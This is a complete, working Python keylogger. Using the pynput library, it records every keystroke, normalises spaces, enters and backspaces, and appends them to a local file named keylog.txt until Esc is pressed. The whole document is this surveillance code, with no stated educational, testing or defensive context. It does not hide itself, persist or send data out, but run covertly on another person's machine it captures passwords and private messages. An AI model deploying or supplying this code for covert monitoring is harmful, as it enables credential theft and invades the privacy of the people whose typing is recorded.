import pynput
from pynput.keyboard import Key, Listener

# Path to the log file
log_file = "keylog.txt"

# Function to write keystrokes to the log file
def write_to_log(key):
    key = str(key)
    if key == "Key.space":
        key = " "
    elif key == "Key.enter":
        key = "\n"
    elif key == "Key.backspace":
        key = "[BACKSPACE]"
    elif key == "Key.shift_r" or key == "Key.shift" or key == "Key.shift_l":
        key = ""
    with open(log_file, "a") as f:
        f.write(key.replace("'", ""))

# Function to handle key presses
def on_press(key):
    write_to_log(key)

# Function to handle key releases
def on_release(key):
    if key == Key.esc:
        return False  # Stop the listener

# Start listening for key events
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
